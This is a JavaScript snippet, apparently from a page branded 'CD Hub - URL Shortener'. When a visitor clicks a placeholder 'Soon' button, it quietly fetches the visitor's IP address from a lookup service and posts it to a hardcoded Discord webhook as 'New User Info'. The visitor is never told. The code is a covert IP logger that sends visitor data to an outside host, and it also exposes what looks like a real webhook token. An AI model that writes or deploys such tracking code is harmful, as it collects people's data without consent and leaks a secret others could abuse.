// Function to send only the IP address to Discord Webhook
async function sendUserIPToWebhook() {
  // Fetching the IP data from the API
  const response = await fetch('https://ipapi.co/json/');
  const data = await response.json();
  // Creating the embed for the Webhook with just the IP
  const embed = {
    title: "New User Info",    // Embed title
    description: "IP Address collected from the website visit.",  // Embed description
    color: 0x32CD32,           // Embed color (green)
    fields: [
      { name: "IP Address", value: data.ip, inline: true }
    ],
    footer: {
      text: "CD Hub - URL Shortener"
    }
  };

  // Replace with your actual Webhook URL
  const webhookURL = 'https://discord.com/api/webhooks/1325964921938116619/-Xyo8xmmD2CCY6V3s8RyzmNe1INHKWNOz0S-o7-3jek-xD8aJ1433Qg518t90gzePUjo';

  // Sending the IP in the embed to the Discord webhook
  await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ embeds: [embed] }),  // Sending the embed JSON
  });
}

// Wait for the page to load completely
window.onload = () => {
  // Select the "Soon" button and add event listener
  const soonButton = document.querySelector('.btn');  // Query for button
  if (soonButton) {  // Ensure button is found
    soonButton.addEventListener('click', async (event) => {
      // Prevent default button behavior
      event.preventDefault();

      // Call the function to send the IP when the "Soon" button is clicked
      await sendUserIPToWebhook();
      console.log('IP sent to webhook'); // Verificar si la función se ejecuta correctamente
    });
  }
};
